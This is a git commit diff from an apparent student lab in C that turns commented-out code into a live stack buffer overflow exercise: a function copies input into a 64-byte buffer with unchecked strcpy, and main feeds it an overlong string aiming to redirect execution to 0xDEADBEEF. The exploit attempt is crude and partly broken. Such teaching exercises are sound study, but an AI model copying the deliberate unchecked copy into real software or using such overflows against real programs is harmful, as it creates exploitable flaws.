a98a945966acce5fa3ee8fb2152641f73069f3b2
Bogdan Botocan <bogdan.botocan@live.com>
2015-11-18 15:19:21 +0200

    Fixed Lab4

--- Lab4-Testulet/Source.c
+++ Lab4-Testulet/Source.c
@@ -1,23 +1,20 @@
-// #include <string.h>
-// 
-// int poatecrapa(char* x)
-// {
-// 	char buff[64];
-// 	int a;
-// 	strcpy(buff, x);
-// 	return 1000;
-// 
-// 	/*
-// 	Stack frame
-// 	buffer
-// 	rip
-// 	*/
-// }
-// 
+/*
+	Exploit itCouldCrash function in order to execute code from address 0xDEADBEEF
+*/
+#include <string.h>
+
+int itCouldCrash(char* x)
+{
+	char buff[64];
+	int a;
+	strcpy(buff, x);
+	return 1000;
+}
+
 int main()
 {
-// 	//					 0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF01234567
-// 	char crapator[80] = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa00000000";	// + 0xDEADBEEF
-// 	strcat(crapator, (char *)(0xDEADBEEF));
-// 	// poatecrapa("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa000000000000");
+ 	//  				 0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF01234567
+ 	char crapator[80] = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa00000000";	// + 0xDEADBEEF
+ 	strcat(crapator, (char *)(0xDEADBEEF));
+ 	itCouldCrash("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa000000000000");
 }
